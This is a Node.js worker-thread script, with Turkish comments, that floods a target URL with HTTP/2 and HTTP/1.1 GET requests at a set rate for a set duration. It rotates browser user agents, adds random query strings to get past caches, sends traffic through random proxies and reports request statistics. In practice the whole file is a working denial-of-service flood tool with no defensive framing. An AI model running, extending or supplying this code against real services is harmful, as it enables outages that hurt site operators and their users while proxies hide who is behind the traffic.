const { parentPort, workerData } = require('worker_threads');
const http2 = require('http2');
const http = require('http');
const https = require('https');
const { URL } = require('url');

const { target, proxies, duration, rate, threads } = workerData;
const url = new URL(target.startsWith('http') ? target : 'http://' + target);
const isHttps = url.protocol === 'https:';

let localStats = { sent: 0, success: 0, failed: 0, bytes: 0 };
let active = true;

// İşletim sisteminin port kilitlenmesini önleyen kalıcı bağlantı havuzları
const httpAgent = new http.Agent({
    keepAlive: true,
    maxSockets: 10000,
    keepAliveMsecs: 5000
});

const httpsAgent = new https.Agent({
    keepAlive: true,
    maxSockets: 10000,
    keepAliveMsecs: 5000
});

// Canlı istatistikleri ana thread'e ilet
const statsInterval = setInterval(() => {
    if (active) parentPort.postMessage({ type: 'stats', data: localStats });
}, 400);

function getRandomUA() {
    const uas = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/125.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15',
        'Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0'
    ];
    return uas[Math.floor(Math.random() * uas.length)];
}

// HTTP/2 İstek Mekanizması (Multiplexing)
function sendHttp2Request(proxyConfig = null) {
    if (!active) return;

    const targetOrigin = url.origin;
    const pathWithGarbage = url.pathname + `?q=${Math.random().toString(36).substring(2, 10)}`;

    try {
        const client = http2.connect(targetOrigin, {
            settings: { enablePush: false, maxConcurrentStreams: 1000 }
        });

        client.on('error', () => {
            localStats.failed++;
            client.destroy();
        });

        for (let i = 0; i < Math.floor(rate / threads); i++) {
            if (!active) break;

            const req = client.request({
                ':method': 'GET',
                ':path': pathWithGarbage,
                'user-agent': getRandomUA(),
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                'accept-encoding': 'gzip, deflate, br',
                'cache-control': 'no-cache'
            });

            localStats.sent++;

            req.on('response', (headers) => {
                if (headers[':status'] === 200) {
                    localStats.success++;
                } else {
                    localStats.failed++;
                }
            });

            req.on('data', (chunk) => {
                localStats.bytes += chunk.length;
            });

            req.on('error', () => {
                localStats.failed++;
            });

            req.end();
        }

        setTimeout(() => {
            if (!client.destroyed) client.close();
        }, 2000);

    } catch (e) {
        localStats.failed++;
    }
}

// HTTP/1.1 İstek Mekanizması (Geri Dönüş / Fallback)
function sendHttp1Request() {
    if (!active) return;

    const pathWithGarbage = url.pathname + `?q=${Math.random().toString(36).substring(2, 10)}`;
    const options = {
        hostname: url.hostname,
        port: url.port || (isHttps ? 443 : 80),
        path: pathWithGarbage,
        method: 'GET',
        headers: {
            'User-Agent': getRandomUA(),
            'Accept': '*/*',
            'Cache-Control': 'no-cache',
            'Connection': 'keep-alive'
        },
        // Kalıcı havuz ataması
        agent: isHttps ? httpsAgent : httpAgent
    };

    if (proxies && proxies.length > 0) {
        const randomProxy = proxies[Math.floor(Math.random() * proxies.length)];
        // Gelen proxy verisinin string tipinde olup olmadığını doğrula
        if (randomProxy && typeof randomProxy === 'string' && randomProxy.includes(':')) {
            const parts = randomProxy.split(':');
            const pIp = parts[0];
            const pPort = parseInt(parts[1], 10);

            if (pIp && !isNaN(pPort) && pPort >= 0 && pPort < 65536) {
                options.hostname = pIp;
                options.port = pPort;
                options.path = url.href;
            }
        }
    }

    const reqLib = isHttps ? https : http;
    const req = reqLib.request(options, (res) => {
        localStats.sent++;
        if (res.statusCode === 200) {
            localStats.success++;
        } else {
            localStats.failed++;
        }
        res.on('data', (chunk) => { localStats.bytes += chunk.length; });
        res.resume();
    });

    req.on('error', () => {
        localStats.sent++;
        localStats.failed++;
    });

    req.setTimeout(2000, () => req.destroy());
    req.end();
}

// Ana Tetikleyici Döngü
const runner = setInterval(() => {
    if (!active) return;

    if (isHttps) {
        sendHttp2Request();
    } else {
        const batchSize = Math.floor(rate / threads) || 1;
        for (let i = 0; i < batchSize; i++) {
            sendHttp1Request();
        }
    }
}, 1000);

// Zaman Aşımı Sınırı (Duration)
setTimeout(() => {
    active = false;
    clearInterval(runner);
    clearInterval(statsInterval);
    process.exit(0);
}, duration);